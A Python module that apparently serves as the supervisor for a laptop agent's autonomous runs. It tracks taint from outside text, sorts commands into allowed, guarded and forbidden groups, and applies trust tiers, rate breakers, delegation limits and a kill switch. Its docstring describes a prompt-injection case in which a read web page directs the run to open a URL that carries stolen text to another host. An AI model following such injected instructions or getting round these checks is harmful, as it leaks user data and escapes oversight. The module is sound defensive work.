"""Every step an autonomous run takes passes through here before it runs.

The approval gate judges one action at a time, as each tool describes it, and MEDIUM runs with
no card in the web app. So a run that had read a web page could be told by that page to
`open url https://elsewhere/?q=<what it read>` and nothing asked: each step was fine alone.
The supervisor is the run's memory. It is plain rules, never a model, because a model that
judges injected text can be talked round by it:

- taint: once the run has read anything it did not write (a page, a file, mail, a note, an MCP
  reply), a step that sends somewhere the text can choose, changes the laptop or changes what is
  remembered is asked about first, even when it would otherwise run silently;
- direct only: the shell, running or rewriting code and deleting files are the user's own
  commands, never a step of a run;
- model trust: a step chosen by a tier that is not trusted (the backup model, unless set
  otherwise) may read and compute, never act; the same holds for a command the router's model
  picks for the user's own sentence;
- off the track: the same step a third time, or two refusals, ends the run;
- one tree: an agent a run delegates to (`delegate`, in `agent team`) shares the run's `RunTree`:
  its taint, its refusals and its stop. A run can start another in no other way, and a trip
  breaker caps the tree's steps a minute, its steps in all, its depth and the agents it starts;
- no running wild: a run also stops past its web budget, past a few requests to one site, past
  its time, past its model calls or past its approval cards; it sends at most one message; a run
  nobody is watching (a scheduled one) may only read and compute; and `AgentLedger` caps runs and
  steps a day across every run and holds the switch that turns agents off;
- every verdict is written to the audit log with the rule that made it.

It supervises what a run asks for. What an approved program then does is the operating
system's to contain, not this module's.
"""
from __future__ import annotations

import json
import os
import threading
import time
from collections import Counter, deque
from dataclasses import dataclass
from datetime import date
from enum import Enum
from pathlib import Path
from typing import Callable
from urllib.parse import urlsplit

from laptop_agent.failures import record_failure
from laptop_agent.storage import atomic_write_text


class Verdict(str, Enum):
    ALLOW = "allow"
    ASK = "ask"
    REFUSE = "refuse"   # this step is not run; the run goes on and is told why
    STOP = "stop"       # the run ends


@dataclass(frozen=True)
class Decision:
    verdict: Verdict
    rule: str = ""
    reason: str = ""


class RunStopped(Exception):
    """The supervisor ended the run. Its text is the run's answer."""


# The agent's commands by what they mean to a run, as the forms `_AGENT_COMMANDS` lists them
# (tests/test_supervisor.py holds the two together: every command is in exactly one group).
# READS: its result is text the user did not write, so it may carry instructions.
READS = (
    "read file", "ask file", "summarize file", "extract text", "extract tables", "analyze spreadsheet",
    "process file", "search files", "recall", "ask knowledge", "notes search", "ask vault", "read note",
    "web search", "news", "research", "summarize youtube", "read screen", "describe image",
    "describe video", "look at webcam", "email digest", "email api search", "solve", "briefing",
)
# GUARDED: runs with no card today, and reaches an address the text can choose, the desktop, or
# what is remembered. Asked about once the run is tainted.
GUARDED = (
    "open url", "inspect page", "save note", "remember", "forget", "knowledge prune", "index file",
    "watch news", "unwatch", "briefing set", "job add", "screenshot", "play music", "window",
)
# CARDED: its own tool already asks at HIGH or CRITICAL, so a second card would add nothing.
CARDED = (
    "download", "file move", "file copy", "file rename", "undo file", "convert file", "organize folder",
    "open app", "message", "workspace", "learn from chat", "email api draft", "email api send", "mcp",
)
# DIRECT: never a step of a run. Starting a run is here too: `agent run` from a step built a fresh
# supervisor with no taint, so a run could launder itself; `delegate` is the one way, and keeps the tree.
# `terminal` and `shell` run the shell like `run command` does, and were unknown here until a test walked
# every branch into the shell (tests/test_supervisor_matrix.py).
DIRECT = ("run command", "terminal", "shell", "code run", "code fix", "file delete", "agent run", "agent team",
          "schedule agent", "autopilot", "agents off", "agents on")
# DELEGATE: hands a sub-task to an agent on a lower tier, in the same tree (offered to `agent team` only).
DELEGATE = ("delegate",)
# SAFE: computed here or read from the user's own stores; neither tainting nor guarded.
SAFE = (
    "scan files", "file info", "knowledge list", "knowledge stats", "notes audit", "windows", "watch health",
    "watches", "image", "document", "weather", "translate", "distance", "trip", "around", "map",
    "hotels near", "total", "average", "count", "jobs", "tasks", "reminders due", "reminder add", "timer",
    "alarm", "timers", "alarms", "lists", "list", "calendar", "convert", "memory", "audit",
)
# A command that both reads and is in another group: a page or a server answers with its own text.
ALSO_READS = ("inspect page", "mcp")
_GROUPS = (("direct", DIRECT), ("guarded", GUARDED), ("carded", CARDED), ("reads", READS), ("safe", SAFE),
           ("delegate", DELEGATE))
# What a delegated agent may run besides READS and `delegate`: its answer goes back to the planner as
# text, so it has nothing to make or change. Live, helpers wrote documents and saved notes instead,
# and one spent all its steps on `scan files` of a folder it made up.
HELPER_COMPUTES = ("file info", "weather", "translate", "distance", "trip", "convert", "total",
                   "average", "count", "calendar")
# Reads a helper may not run: they use the laptop's camera or screen, and the webcam asks nothing
# (review of #320). The planner can still run them.
HELPER_SENSORS = ("look at webcam", "read screen")
MAX_REPEATS = 2
MAX_REFUSALS = 2
# The trip breaker, over the whole run tree. Read at each check, so a test can patch them. The rate
# must stay below the total: at 20 and 20 a burst was stopped only where the total would stop it.
MAX_STEPS_PER_MINUTE = 15
MAX_TREE_STEPS = 20
MAX_DEPTH = 2           # the planner is depth 0
MAX_AGENTS = 4          # agents one tree may start, the planner not counted
TIER_RANK = {"fast": 0, "smart": 1, "ultra": 2}
# No running wild. A step that reaches a service off the laptop costs its requests from the run's web
# budget: `research` searches and then fetches up to five pages, so a 20-step run of it was over 100
# requests in minutes. One site (a URL's host, or the service a command calls) takes a few at most.
MAX_WEB_REQUESTS = 30
MAX_PER_SITE = 5
WEB_COST = {
    "research": 6, "research report": 6, "solve": 6, "web search": 1, "news": 1, "summarize youtube": 1,
    "open url": 1, "download": 1, "inspect page": 1, "weather": 1, "translate": 1, "distance": 1, "trip": 1,
    "around": 1, "map": 1, "hotels near": 1, "image": 1, "email digest": 1, "email api search": 1,
    "email api draft": 1, "email api send": 1, "message": 1, "mcp": 1,
}
# Commands that reach the same search engine, whatever words follow them.
SEARCHES = ("research", "research report", "solve", "web search", "news")
SENDS = ("message", "email api send")
MAX_SENDS = 1           # messages or emails one run may send
MAX_CARDS = 3           # approval cards one run may raise, so a run cannot wear the user down
MAX_RUN_SECONDS = 600
MAX_MODEL_CALLS = 30    # every call a run makes to a model, retries and closing answers included
MAX_RUNS_PER_DAY = 30   # across every run, scheduled ones included (AgentLedger)
MAX_STEPS_PER_DAY = 150
MIN_AGENT_INTERVAL = 3600   # a scheduled agent runs at most once an hour
MAX_AGENT_SCHEDULES = 5


def _matches(lowered: str, form: str) -> bool:
    return lowered == form or lowered.startswith(form + " ")


def group_of(command: str) -> tuple[str, str]:
    """(group, form) for a command, by its longest matching form; ("unknown", "") for none."""
    lowered = " ".join((command or "").lower().split())
    best = ("unknown", "")
    for name, forms in _GROUPS:
        for form in forms:
            if _matches(lowered, form) and len(form) > len(best[1]):
                best = (name, form)
    return best


def _form_head(form: str) -> str:
    """A reference form's fixed words, before its first `<placeholder>` or `[option]`."""
    return form.split("<", 1)[0].split("[", 1)[0].strip()


def allowed_in_a_run(form: str) -> bool:
    """Whether an agent command form may be offered to a run at all."""
    return group_of(_form_head(form))[0] != "direct"


def is_read(command: str) -> bool:
    """Whether a command's result is outside text: READS, or a page or server answering (ALSO_READS)."""
    lowered = " ".join((command or "").lower().split())
    return group_of(lowered)[0] == "reads" or any(_matches(lowered, form) for form in ALSO_READS)


def helper_may(command: str) -> bool:
    """Whether a delegated agent may run a command: a read, a computation, or `delegate`."""
    group, form = group_of(command)
    if form in HELPER_SENSORS:
        return False
    return group in {"reads", "delegate"} or form in HELPER_COMPUTES


def offered_to_helper(form: str) -> bool:
    """Whether a reference form (`total|average|count <column> ...`) is offered to a delegated agent."""
    head, _, rest = _form_head(form).partition(" ")
    return any(helper_may(f"{alternative} {rest}") for alternative in head.split("|"))


TIERS = ("fast", "smart", "ultra", "fallback")
UNTRUSTED = "LAPTOP_AGENT_UNTRUSTED_MODELS"
# What a model that is not trusted may still have run: reading and computing, nothing else.
_UNTRUSTED_MAY = frozenset({"safe", "reads"})


def untrusted_tiers() -> frozenset[str]:
    """The model tiers whose choices are not trusted to act (`LAPTOP_AGENT_UNTRUSTED_MODELS`, comma
    separated, from fast, smart, ultra, fallback). Unset, it is the cross-provider backup: a run
    took its steps from whichever tier answered first, so a free backup model had the authority
    of the best one. Set but empty trusts every tier. Read on every call, so a test can switch it."""
    raw = os.environ.get(UNTRUSTED)
    if raw is None:
        return frozenset({"fallback"})
    return frozenset(name for name in (part.strip().lower() for part in raw.split(",")) if name in TIERS)


def trusted(tier: str) -> bool:
    """A tier nobody named is not trusted: the rule fails closed."""
    return tier in TIERS and tier not in untrusted_tiers()


def site_of(command: str, form: str) -> str:
    """The site a network step reaches: a URL's host, the search engine, or the service its command calls."""
    for word in command.split():
        if word.lower().startswith(("http://", "https://")):
            return urlsplit(word).hostname or form
    return "web search" if form in SEARCHES else form


def _count(data: dict[str, object], key: str) -> int:
    value = data.get(key, 0)
    return value if isinstance(value, int) else 0


class AgentLedger:
    """What every run shares across a day, kept in a file so a restart does not reset it: the runs and
    steps taken today (`MAX_RUNS_PER_DAY`, `MAX_STEPS_PER_DAY`), and the switch that turns agents off.
    A scheduled agent started a fresh run every time it was due, with a fresh budget and no ceiling."""

    def __init__(self, path: Path, today: Callable[[], date] = date.today) -> None:
        self.path = path
        self._today = today
        self._lock = threading.Lock()

    def _read(self) -> dict[str, object]:
        try:
            data = json.loads(self.path.read_text(encoding="utf-8"))
        except FileNotFoundError:
            data = {}
        except (OSError, ValueError) as exc:
            # Unreadable counts fail closed: no runs today rather than an unlimited day.
            record_failure("agents/ledger", exc)
            data = {"date": self._today().isoformat(), "runs": MAX_RUNS_PER_DAY, "steps": MAX_STEPS_PER_DAY}
        if data.get("date") != self._today().isoformat():
            data = {"off": bool(data.get("off")), "date": self._today().isoformat(), "runs": 0, "steps": 0}
        return data

    def _write(self, data: dict[str, object]) -> None:
        atomic_write_text(self.path, json.dumps(data, indent=2))

    def state(self) -> dict[str, object]:
        with self._lock:
            return self._read()

    def set_off(self, off: bool) -> None:
        with self._lock:
            data = self._read()
            data["off"] = off
            self._write(data)

    def start_run(self) -> str:
        """Count a run starting, or say why none may: agents are off, or today's runs are spent."""
        with self._lock:
            data = self._read()
            if data.get("off"):
                return "agents are turned off (say `agents on` to turn them back on)"
            if _count(data, "runs") >= MAX_RUNS_PER_DAY:
                return f"today's {MAX_RUNS_PER_DAY} agent runs are used up; agents start again tomorrow"
            data["runs"] = _count(data, "runs") + 1
            self._write(data)
            return ""

    def charge_step(self) -> bool:
        """Count one step of any run; False once today's steps are spent, or agents were turned off."""
        with self._lock:
            data = self._read()
            if data.get("off") or _count(data, "steps") >= MAX_STEPS_PER_DAY:
                return False
            data["steps"] = _count(data, "steps") + 1
            self._write(data)
            return True


def routed(command: str, tier: str) -> Decision:
    """The verdict on one command a model picked for the user's own sentence (the router)."""
    group, _form = group_of(command)
    if trusted(tier) or group in _UNTRUSTED_MAY:
        return Decision(Verdict.ALLOW, group)
    return Decision(Verdict.REFUSE, "trust", f"the {tier or 'unnamed'} model is not trusted to choose that")


class RunTree:
    """What every agent of one run shares: taint, refusals, the breaker's counts and the stop.

    Kept apart from `Supervisor` so a delegated agent cannot start cleaner than the run that
    started it, and one stop anywhere in the tree stops every agent in it."""

    def __init__(self, clock: Callable[[], float] = time.monotonic, *, ledger: AgentLedger | None = None,
                 unattended: bool = False) -> None:
        self.tainted_by = ""
        self.refusals = 0
        self.last_refusal = ""
        self.stopped: Decision | None = None
        self.agents: list[dict[str, object]] = []
        self.steps = 0
        self.web = 0
        self.sites: Counter[str] = Counter()
        self.sends = 0
        self.cards = 0
        self.calls = 0
        # A run nobody is watching (a scheduled one): no card would be answered, so it only reads and computes.
        self.unattended = unattended
        self._ledger = ledger
        self._clock = clock
        self._started = clock()
        self._recent: deque[float] = deque()

    def add_agent(self, parent: str, depth: int, tier: str, task: str) -> str:
        agent = f"a{len(self.agents) + 1}"
        self.agents.append({"id": agent, "parent": parent, "depth": depth, "tier": tier, "task": task, "steps": []})
        return agent

    def stop(self, rule: str, reason: str) -> Decision:
        self.stopped = Decision(Verdict.STOP, rule, reason)
        return self.stopped

    def count_step(self) -> Decision | None:
        """Count one step of any agent; the breaker's verdict when it trips."""
        now = self._clock()
        self.steps += 1
        self._recent.append(now)
        while self._recent and self._recent[0] <= now - 60:
            self._recent.popleft()
        if len(self._recent) > MAX_STEPS_PER_MINUTE:
            return self.stop("breaker:rate", f"its agents took more than {MAX_STEPS_PER_MINUTE} steps in a minute")
        if self.steps > MAX_TREE_STEPS:
            return self.stop("breaker:steps", f"its agents took more than {MAX_TREE_STEPS} steps in all")
        if now - self._started > MAX_RUN_SECONDS:
            return self.stop("breaker:time", f"it ran for more than {MAX_RUN_SECONDS // 60} minutes")
        if self._ledger is not None and not self._ledger.charge_step():
            return self.stop("breaker:daily", f"agents were turned off, or today's {MAX_STEPS_PER_DAY} agent steps "
                                              "are used up")
        return None

    def count_call(self) -> Decision | None:
        """Count one call to a model by any agent; the stop once the run has made too many. Another stop
        does not refuse a call: the run is still asked once what its steps found."""
        self.calls += 1
        if self.calls > MAX_MODEL_CALLS:
            return self.stop("breaker:calls", f"its agents asked a model more than {MAX_MODEL_CALLS} times")
        return None

    def charge(self, command: str, group: str, form: str, asks: bool) -> Decision | None:
        """What a step about to be allowed or asked costs: web requests, a site's share, a send, a card."""
        cost = WEB_COST.get(form, 0)
        if cost:
            site = site_of(command, form)
            if self.web + cost > MAX_WEB_REQUESTS:
                return self.stop("breaker:web", f"it would make more than {MAX_WEB_REQUESTS} web requests")
            if self.sites[site] + 1 > MAX_PER_SITE:
                return self.stop("breaker:site", f"it went to {site} more than {MAX_PER_SITE} times")
            self.web += cost
            self.sites[site] += 1
        if form in SENDS:
            if self.sends >= MAX_SENDS:
                return Decision(Verdict.REFUSE, "sends", f"a run sends at most {MAX_SENDS} message")
            self.sends += 1
        if asks or group == "carded":
            if self.cards >= MAX_CARDS:
                return self.stop("breaker:cards", f"it would ask you to approve more than {MAX_CARDS} steps")
            self.cards += 1
        return None


class Supervisor:
    """One agent's supervisor. `check` before each step; `refused` when a step was not approved.

    `tree` is shared by every agent of the same run (a fresh one when not given); `tier` is the tier
    the agent was assigned, which `delegate` may only go below."""

    def __init__(self, tree: RunTree | None = None, *, agent: str = "a0", parent: str = "", depth: int = 0,
                 tier: str = "") -> None:
        self.tree = tree or RunTree()
        self.agent = agent
        self.parent = parent
        self.depth = depth
        self.tier = tier
        self._seen: dict[str, int] = {}

    @property
    def tainted_by(self) -> str:
        return self.tree.tainted_by

    def refused(self, why: str = "you did not approve it") -> None:
        self.tree.refusals += 1
        self.tree.last_refusal = why

    def check(self, command: str, tier: str = "smart") -> Decision:
        tree = self.tree
        if tree.stopped is not None:
            return tree.stopped
        lowered = " ".join((command or "").lower().split())
        tripped = tree.count_step()
        if tripped is not None:
            return tripped
        if tree.refusals >= MAX_REFUSALS:
            # With the cause: live, "2 of its steps were refused" left the user guessing which rule.
            return tree.stop("refusals", f"{tree.refusals} of its steps were refused, the last because "
                                         f"{tree.last_refusal}")
        self._seen[lowered] = self._seen.get(lowered, 0) + 1
        if self._seen[lowered] > MAX_REPEATS:
            if self.depth > 0:
                # A helper going in circles is told to answer, not counted toward the stop: live, a
                # helper's repeat ended the team before its planner had done anything. Its step cap bounds it.
                return Decision(Verdict.REFUSE, "repeat", "you already ran this step twice: answer in FINAL "
                                                          "with what you have")
            return tree.stop("repeat", f"it tried the same step a third time: {command[:120]}")
        group, form = group_of(lowered)
        if group == "direct":
            self.refused(f"\"{form}\" is never a step of an agent run (ask for it yourself, outside agent mode)")
            return Decision(Verdict.REFUSE, "direct", tree.last_refusal)
        if not trusted(tier) and group not in _UNTRUSTED_MAY:
            self.refused(f"the {tier or 'unnamed'} model chose it, and that model may read and compute but not act")
            return Decision(Verdict.REFUSE, "trust", tree.last_refusal)
        if tree.unattended and group not in {*_UNTRUSTED_MAY, "delegate"}:
            self.refused("nobody is watching this run (it was scheduled), so it may read and compute but not act")
            return Decision(Verdict.REFUSE, "unattended", tree.last_refusal)
        if self.depth > 0 and not helper_may(lowered):
            reason = "a helper only looks things up and works things out: answer in FINAL and the planner will act on it"
            # Counted only when the tree has read outside text and the step is a real command: then it may be
            # an injected attempt to act (review of #320). Prose written as an ACTION is not: live, a helper
            # wrote "ACTION: I don't need a command" twice and that ended the whole run.
            if tree.tainted_by and group != "unknown":
                self.refused(reason)
            return Decision(Verdict.REFUSE, "helper", reason)
        if group == "delegate":
            return self._delegate(lowered)
        tainted_before = tree.tainted_by
        asks = bool(tainted_before) and group in {"guarded", "unknown"}
        charged = tree.charge(lowered, group, form, asks)
        if charged is not None:
            if charged.verdict is Verdict.REFUSE:
                self.refused(charged.reason)
            return charged
        if is_read(lowered):
            tree.tainted_by = tree.tainted_by or form or lowered[:40]
        if asks:
            return Decision(Verdict.ASK, "taint", f"This run has read outside text ({tainted_before}), which can "
                                                  "carry instructions, and now wants to act on the laptop or send "
                                                  "something out.")
        return Decision(Verdict.ALLOW, group)

    def _delegate(self, lowered: str) -> Decision:
        """`delegate <tier> <sub-task>`: only to a tier below this agent's own, within the breaker."""
        words = lowered.split(maxsplit=2)
        target = words[1] if len(words) > 1 else ""
        own = TIER_RANK.get(self.tier)
        if own is None or target not in TIER_RANK or TIER_RANK[target] >= own:
            self.refused(f"an agent on the {self.tier or 'unnamed'} tier may hand work only to a lower tier, "
                         f"not \"{target or 'none'}\"")
            return Decision(Verdict.REFUSE, "delegate-tier", self.tree.last_refusal)
        if self.depth + 1 > MAX_DEPTH:
            return self.tree.stop("breaker:depth", f"an agent tried to delegate deeper than {MAX_DEPTH} levels")
        if len(self.tree.agents) >= MAX_AGENTS:
            return self.tree.stop("breaker:agents", f"it tried to start more than {MAX_AGENTS} agents")
        return Decision(Verdict.ALLOW, "delegate")
